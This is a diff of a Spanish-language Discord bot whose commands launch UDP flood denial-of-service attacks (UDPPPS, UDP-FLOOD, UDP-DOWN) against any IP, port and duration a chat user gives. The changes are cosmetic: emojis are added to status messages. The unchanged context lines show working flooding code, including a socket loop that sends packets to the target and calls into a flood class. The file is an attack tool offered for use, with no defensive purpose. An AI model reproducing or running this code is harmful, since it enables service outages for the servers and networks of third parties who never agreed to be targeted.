@@ -26,19 +26,16 @@ async def on_ready():
 @bot.command(name='ayuda')
 async def ayuda(ctx):
     help_text = (
-        "**Comandos disponibles:**\n"
+        "⚡**Comandos disponibles:**⚡\n"
         "- `!ayuda`\n"
-        "- `!methods`\n"
-        "- `!udppps <ip> <port> <time>`\n"
-        "- `!udpflood <ip> <port> <time>`\n"
-        "- `!udp-down <ip> <port> <time>`"
+        "- `!methods`"
     )
     await ctx.send(content=help_text)
 
 @bot.command(name='methods')
 async def methods(ctx):
     methods_text = (
-        "**Métodos disponibles:**\n"
+        "💫**Métodos disponibles:**💫\n"
         "- `!udppps <ip> <port> <time>`\n"
         "- `!udpflood <ip> <port> <time>`\n"
         "- `!udp-down <ip> <port> <time>`"
@@ -109,20 +106,20 @@ class Brutalize:
 async def udppps(ctx, ip: str, port: int, tiempo: int):
     global attack_in_progress, last_attack_time
     if attack_in_progress:
-        await ctx.send("Ya hay un ataque en curso. Espera a que termine antes de iniciar otro.")
+        await ctx.send("❌Ya hay un ataque en curso❌, espera a que termine antes de iniciar otro!")
         return
     if time.time() - last_attack_time < cooldown_seconds:
-        await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque.")
+        await ctx.send(f"❌Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque❌")
         return
     attack_in_progress = True
-    await ctx.send(f"Atacando a {ip}:{port} por {tiempo} segundos (UDPPPS)...")
+    await ctx.send(f"✅🚀Atacando a {ip}:{port} por {tiempo} segundos (UDPPPS)...")
     try:
         brute = Brutalize(ip, port, 1024, 5)
         loop = asyncio.get_running_loop()
         await loop.run_in_executor(None, brute.flood, tiempo)
-        await ctx.send(f"UDPPPS finalizado.")
+        await ctx.send(f"✅UDPPPS finalizado✅")
     except Exception as e:
-        await ctx.send(f"Error al ejecutar UDPPPS: {e}")
+        await ctx.send(f"❌Error al ejecutar UDPPPS❌: {e}")
     finally:
         attack_in_progress = False
         last_attack_time = time.time()
@@ -130,9 +127,9 @@ async def udppps(ctx, ip: str, port: int, tiempo: int):
 @udppps.error
 async def udppps_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Faltan argumentos. Uso correcto: `!udppps <ip> <port> <time>`")
+        await ctx.send("❌Uso correcto: `!udppps <ip> <port> <time>`")
     else:
-        await ctx.send(f"Ocurrió un error: {error}")
+        await ctx.send(f"❌Ocurrió un error: {error}")
 
 # ------------------ UDP-FLOOD ------------------
 def send_packet_flood(ip, port, amplifier, stop_event):
@@ -163,7 +160,7 @@ def udp_flood_attack(ip, port, duration, amplifier, stop_event):
 async def udpflood(ctx, ip: str, port: int, tiempo: int):
     global attack_in_progress, last_attack_time
     if attack_in_progress:
-        await ctx.send("Ya hay un ataque en curso. Espera a que termine antes de iniciar otro.")
+        await ctx.send("❌Ya hay un ataque en curso❌, espera a que termine antes de iniciar otro")
         return
     if time.time() - last_attack_time < cooldown_seconds:
         await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque.")
@@ -174,9 +171,9 @@ async def udpflood(ctx, ip: str, port: int, tiempo: int):
     try:
         loop = asyncio.get_running_loop()
         await loop.run_in_executor(None, udp_flood_attack, ip, port, tiempo, 750, stop_event)
-        await ctx.send(f"UDP-FLOOD finalizado.")
+        await ctx.send(f"✅UDP-FLOOD finalizado✅")
     except Exception as e:
-        await ctx.send(f"Error al ejecutar UDP-FLOOD: {e}")
+        await ctx.send(f"❌Error al ejecutar UDP-FLOOD❌: {e}")
     finally:
         attack_in_progress = False
         last_attack_time = time.time()
@@ -184,22 +181,22 @@ async def udpflood(ctx, ip: str, port: int, tiempo: int):
 @udpflood.error
 async def udpflood_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Faltan argumentos. Uso correcto: `!udpflood <ip> <port> <time>`")
+        await ctx.send("❌Uso correcto: `!udpflood <ip> <port> <time>`")
     else:
-        await ctx.send(f"Ocurrió un error: {error}")
+        await ctx.send(f"❌Ocurrió un error❌: {error}")
 
 # ------------------ UDP-DOWN ------------------
 @bot.command(name='udp-down')
 async def udp_down(ctx, ip: str, port: int, tiempo: int):
     global attack_in_progress, last_attack_time
     if attack_in_progress:
-        await ctx.send("Ya hay un ataque en curso. Espera a que termine antes de iniciar otro.")
+        await ctx.send("❌Ya hay un ataque en curso❌, espera a que termine antes de iniciar otro")
         return
     if time.time() - last_attack_time < cooldown_seconds:
-        await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque.")
+        await ctx.send(f"❌Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque❌")
         return
     attack_in_progress = True
-    await ctx.send(f"Atacando a {ip}:{port} por {tiempo} segundos (UDP-DOWN)...")
+    await ctx.send(f"🚀✅Atacando a {ip}:{port} por {tiempo} segundos (UDP-DOWN)...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
@@ -209,9 +206,9 @@ async def udp_down(ctx, ip: str, port: int, tiempo: int):
             s.sendto(payload, (ip, port))
             sent_packets += 1
             await asyncio.sleep(0)
-        await ctx.send(f"UDP-DOWN finalizado. Paquetes enviados: {sent_packets}")
+        await ctx.send(f"✅UDP-DOWN finalizado✅, paquetes enviados: {sent_packets}")
     except Exception as e:
-        await ctx.send(f"Error al ejecutar UDP-DOWN: {e}")
+        await ctx.send(f"❌Error al ejecutar UDP-DOWN❌: {e}")
     finally:
         attack_in_progress = False
         last_attack_time = time.time()
